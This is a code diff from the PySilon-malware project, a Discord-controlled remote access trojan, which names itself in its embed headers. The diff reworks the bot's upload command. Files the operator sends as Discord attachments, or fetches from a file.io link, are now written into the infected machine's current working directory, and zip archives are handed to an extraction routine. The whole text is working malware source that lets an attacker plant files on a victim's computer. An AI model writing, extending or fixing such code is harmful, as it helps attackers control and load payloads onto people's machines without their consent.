@@ -94,19 +94,19 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
         
         try:
             filename = msg.attachments[0].filename
-            await msg.attachments[0].save(fp=filename)
+            await msg.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
         except: return await ctx.send("```❗ File failed to upload.```")
 
-        embed = discord.Embed(title=f"🟢 Success",description=f"Your file '{filename}' has been successfully uploaded.", colour=discord.Colour.green())
+        embed = discord.Embed(title=f"🟢 Success",description=f"Your file `{filename}` has been successfully uploaded.", colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed) 
 
         if filename.endswith('.zip'):
-            await is_archive(filename)       
+            await is_archive('/'.join(working_directory) + '/' + filename)   
 
     elif argument == 'big':
         if name_of_file != None:
-            embed = discord.Embed(title='📤 Waiting for file...', description='Please upload your file to [file.io](https://file.io/) and send the link here.', colour=discord.Colour.blue())
+            embed = discord.Embed(title='📤 Waiting for file...', description='Please upload your file to [file.io](<https://file.io/>) and send the link here.', colour=discord.Colour.blue())
             embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
             await ctx.send(embed=embed)
 
@@ -125,16 +125,16 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
             response = requests.get(download_link)
 
             if response.status_code == 200:
-                with open(f'{name_of_file}', 'wb') as f:
+                with open('/'.join(working_directory) + '/' + name_of_file, 'wb') as f:
                     f.write(response.content)
             else: return await ctx.send("```❗ File failed to upload.```")
             
-            embed = discord.Embed(title=f"🟢 Success",description=f"```Your file '{name_of_file}' has been successfully uploaded.```", colour=discord.Colour.green())
+            embed = discord.Embed(title=f"🟢 Success",description=f"```Your file `{name_of_file}` has been successfully uploaded.```", colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
 
             if name_of_file.endswith('.zip'):
-                await is_archive(name_of_file)
+                await is_archive('/'.join(working_directory) + '/' + name_of_file)
 
         else:
             embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload big <file_name.ext>```', colour=discord.Colour.red())
